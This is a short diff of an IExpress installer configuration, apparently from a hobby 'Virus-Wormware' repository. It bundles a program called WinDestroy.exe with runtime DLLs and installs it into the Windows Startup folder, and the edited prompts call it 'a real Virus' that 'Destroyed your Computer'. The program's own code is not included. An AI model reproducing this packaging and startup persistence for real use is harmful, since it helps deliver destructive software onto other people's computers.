@@ -21,9 +21,9 @@ AdminQuietInstCmd=%AdminQuietInstCmd%
 UserQuietInstCmd=%UserQuietInstCmd%
 SourceFiles=SourceFiles
 [Strings]
-InstallPrompt=This is a real Virus. Please Continue at your own risk.
+InstallPrompt=This is a real Virus. Are you sure to run it?
 DisplayLicense=
-FinishMessage=Successfully Installed the Virus
+FinishMessage=Successfully Destroyed your Computer
 TargetName=C:\Users\pppmi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.EXE
 FriendlyName=WinDestroy
 AppLaunched=WinDestroy.exe
@@ -31,7 +31,23 @@ PostInstallCmd=<None>
 AdminQuietInstCmd=
 UserQuietInstCmd=
 FILE0="WinDestroy.exe"
+FILE1="libatomic-1.dll"
+FILE2="libgcc_s_seh-1.dll"
+FILE3="libgomp-1.dll"
+FILE4="libquadmath-0.dll"
+FILE5="libssp-0.dll"
+FILE6="libstdc++-6.dll"
+FILE7="libwinpthread-1.dll"
 [SourceFiles]
-SourceFiles0=C:\Users\pppmi\Documents\GitHub\Virus-Wormware\main virus\
+SourceFiles0=C:\Users\pppmi\Documents\GitHub\Virus-Wormware\bin\
+SourceFiles1=C:\Users\pppmi\Documents\RANDOMS\VMSHARE\DLL\
 [SourceFiles0]
 %FILE0%=
+[SourceFiles1]
+%FILE1%=
+%FILE2%=
+%FILE3%=
+%FILE4%=
+%FILE5%=
+%FILE6%=
+%FILE7%=
